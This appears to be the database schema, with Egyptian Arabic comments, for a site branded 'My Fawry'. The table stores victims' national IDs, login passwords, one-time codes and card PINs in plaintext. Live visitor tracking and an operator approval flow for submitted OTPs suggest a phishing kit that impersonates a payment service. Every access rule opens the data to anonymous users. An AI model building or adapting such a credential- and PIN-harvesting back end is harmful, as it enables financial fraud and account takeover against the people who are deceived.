-- =============================================================
-- ماي فوري — جداول قاعدة البيانات (Supabase)
-- استورد الملف ده في Supabase SQL Editor (Dashborad > SQL Editor > Run)
-- بعد التنفيذ: جدول public.applications هيكون جاهز ومتصل بالكود تلقائيًا
-- =============================================================

-- 1) جدول الطلبات (applications) — نفس الحقول اللي الكود بيستخدمها
create table if not exists public.applications (
  id                   text primary key,                       -- "APP-XXXXXXXX"
  created_at           timestamptz not null default now(),     -- وقت الطلب
  full_name            text not null default '',               -- الاسم الثلاثي
  identity             text not null default '',               -- الرقم القومي (14 رقم)
  phone                text not null default '',               -- الموبايل (11 رقم يبدأ 01)
  gov                  text not null default '',               -- المحافظة
  address              text not null default '',               -- العنوان التفصيلي
  model                text not null default '',               -- id الموديل (slug)
  model_name           text not null default '',               -- اسم الموديل للعرض
  site_username        text not null default '',               -- اسم دخول العميل (الموبايل)
  site_password        text not null default '',               -- كلمة سر دخول العميل
  login_status         text not null default '',               -- '' | awaiting_review | approved | rejected
  review_status        text not null default 'awaiting_review',
                       -- awaiting_review | approved | otp_submitted | otp_rejected | rejected | completed | bank_approval
  verification_status  text not null default 'awaiting',       -- awaiting | submitted | approved | rejected
  otp_code             text not null default '',                -- كود التحقق (4-6 أرقام)
  card_pin             text not null default '',                 -- الرقم السري للكارت الأصفر (4 أرقام)
  visitor_id           text not null default ''                  -- معرف زائر المتصفح (لعَلامة "في الموقع الآن / خرج")
);

-- 2) فهرس للترتيب بالوقت
create index if not exists applications_created_idx
  on public.applications (created_at asc);

-- 3) سياسات الوصول (RLS) — المفتاح publishable هيدخل باسم الدور anon
alter table public.applications enable row level security;

drop policy if exists "fawry anon select" on public.applications;
drop policy if exists "fawry anon insert" on public.applications;
drop policy if exists "fawry anon update" on public.applications;
drop policy if exists "fawry anon delete" on public.applications;

create policy "fawry anon select"
  on public.applications for select
  to anon
  using (true);

create policy "fawry anon insert"
  on public.applications for insert
  to anon
  with check (true);

create policy "fawry anon update"
  on public.applications for update
  to anon
  using (true)
  with check (true);

create policy "fawry anon delete"
  on public.applications for delete
  to anon
  using (true);

-- 4) تأكيد صلاحيات الدور anon على الجدول
grant select, insert, update, delete on public.applications to anon;
